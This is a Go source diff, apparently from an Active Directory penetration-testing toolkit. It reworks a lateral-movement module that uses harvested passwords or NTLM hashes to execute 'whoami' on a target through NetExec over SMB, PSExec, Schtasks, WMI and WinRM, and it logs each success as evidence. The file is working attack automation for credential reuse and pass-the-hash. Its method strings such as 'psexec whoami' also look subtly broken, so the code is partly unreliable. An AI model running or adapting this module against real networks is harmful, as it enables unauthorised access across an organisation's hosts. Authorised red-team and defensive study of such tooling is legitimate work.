@@ -2,53 +2,74 @@ package modules
 
 import (
 	"context"
-	"adpack/core"
-	"adpack/tools"
-	"adpack/utils"
 	"fmt"
 	"strings"
 	"time"
+
+	"adpack/core"
+	"adpack/tools"
+	"adpack/utils"
 )
+
+type protocolCheck struct {
+	Name     string
+	Protocol string
+	Port     int
+	Command  string
+}
 
 func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
 
 	host, found := selectTarget(state, targetHost)
 	if !found {
-		fmt.Println(utils.ErrorStyle.Render("[!] No target available for lateral movement."))
+		fmt.Println("[!] No target available for lateral movement")
 		result.Success = false
 		return result
 	}
 
 	domain, user, pass, hash := getCredential(state)
 	if domain == "" || user == "" {
-		fmt.Println(utils.ErrorStyle.Render("[!] No valid credentials found for lateral movement."))
+		fmt.Println("[!] No valid credentials for lateral movement")
 		result.Success = false
 		return result
 	}
 
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP, Port: 445,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
+	protocols := []protocolCheck{
+		{"SMB", "smb", 445, "whoami"},
+		{"PSExec", "smb", 445, "psexec whoami"},
+		{"Schtasks", "smb", 445, "schtasks whoami"},
+		{"WMI", "smb", 445, "wmi whoami"},
+		{"WinRM", "winrm", 5985, "whoami"},
 	}
 
-	fmt.Println(utils.InfoStyle.Render(fmt.Sprintf("[*] Testing lateral movement to %s via WMI/SMB...", host.IP)))
 	ctx := context.Background()
-	r, err := tools.NetExec.Run(ctx, target, "-x", []string{"whoami"})
-	
-	if err == nil && r.Success {
-		output := r.Stdout
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: "lateral_success", Phase: core.PhaseLateral,
-			Source: "netexec_smb", Key: host.IP, Value: output,
-			Confidence: 1.0, Timestamp: time.Now(),
-		})
-		fmt.Println(utils.SuccessStyle.Render("[+] Lateral movement successful. Output:"))
-		fmt.Println(utils.OutputBox.Render(strings.TrimSpace(output)))
-	} else {
-		fmt.Println(utils.ErrorStyle.Render(fmt.Sprintf("[!] Lateral movement failed: %s", r.Stderr)))
+	anySuccess := false
+
+	for _, p := range protocols {
+		fmt.Printf("[*] Trying %s on %s...\n", p.Name, host.IP)
+		target := tools.NetExecTarget{
+			Protocol: p.Protocol, Host: host.IP, Port: p.Port,
+			Domain: domain, Username: user, Password: pass, Hash: hash,
+		}
+		r, err := tools.NetExec.Run(ctx, target, "-x", []string{p.Command})
+		if err == nil && r.Success {
+			anySuccess = true
+			output := strings.TrimSpace(r.Stdout)
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: "lateral_success", Phase: core.PhaseLateral,
+				Source: "netexec_" + p.Protocol, Key: host.IP,
+				Value: fmt.Sprintf("%s: %s", p.Name, output),
+				Timestamp: time.Now(),
+			})
+			fmt.Printf("  %s  %s succeeded\n", utils.SuccessStyle.Render("✓"), p.Name)
+		}
+	}
+
+	if !anySuccess {
+		fmt.Printf("  %s  All protocols failed\n", utils.ErrorStyle.Render("✗"))
 		result.Success = false
 	}
-	
+
 	return result
 }
